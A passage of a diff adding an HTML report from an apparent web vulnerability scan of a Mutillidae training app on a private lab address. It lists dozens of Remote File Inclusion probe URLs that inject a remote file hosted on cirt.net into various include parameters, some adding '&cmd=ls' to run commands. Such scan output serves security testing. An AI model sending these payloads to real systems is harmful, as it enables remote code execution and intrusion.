+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?includeDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?includeDir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?includeDir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?includeFooter=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?includeFooter=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?includeFooter=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?includeFooter=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?includesdir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?includesdir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?includesdir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?includesdir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?insPath=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?insPath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?insPath=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?insPath=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?lang=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?lang=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?lang=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?lang=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?language=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?language=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?language=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?language=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?language=en&amp;main_page=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?language=en&amp;main_page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?language=en&amp;main_page=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?language=en&amp;main_page=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?lizge=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?lizge=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?lizge=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls">http://192.168.1.51:80/mutillidae/index.php?lizge=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?lng=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?lng=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?lng=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?lng=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?load=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?load=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?load=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?load=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?loadpage=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?loadpage=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?loadpage=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?loadpage=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?main_tabid=1&amp;main_content=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?main_tabid=1&amp;main_content=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?main_tabid=1&amp;main_content=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?main_tabid=1&amp;main_content=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?may=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?may=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?may=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?may=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?middle=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?middle=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?middle=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?middle=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt?&amp;cmd=</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt?&amp;cmd=: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt?&amp;cmd=">http://192.168.1.51:80/mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt?&amp;cmd=</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?modpath=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?modpath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?modpath=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?modpath=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?module=PostWrap&amp;page=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?module=PostWrap&amp;page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?module=PostWrap&amp;page=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?module=PostWrap&amp;page=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?news7[\&quot;functions\&quot;]=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?news7[\&quot;functions\&quot;]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?news7[\&quot;functions\&quot;]=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?news7[\&quot;functions\&quot;]=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?news_include_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?news_include_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?news_include_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?news_include_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?open=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?open=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?open=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?open=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?option=com_custompages&amp;cpage=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?option=com_custompages&amp;cpage=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?option=com_custompages&amp;cpage=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?option=com_custompages&amp;cpage=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt%00</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt%00: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt%00">http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt%00</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pagehttps://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pagehttps://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pagehttps://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?pagehttps://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?page[path]=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?page[path]=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?page[path]=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls">http://192.168.1.51:80/mutillidae/index.php?page[path]=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pagename=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pagename=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pagename=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?pagename=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pager=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pager=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pager=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?pager=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pagina=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pagina=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pagina=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?pagina=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
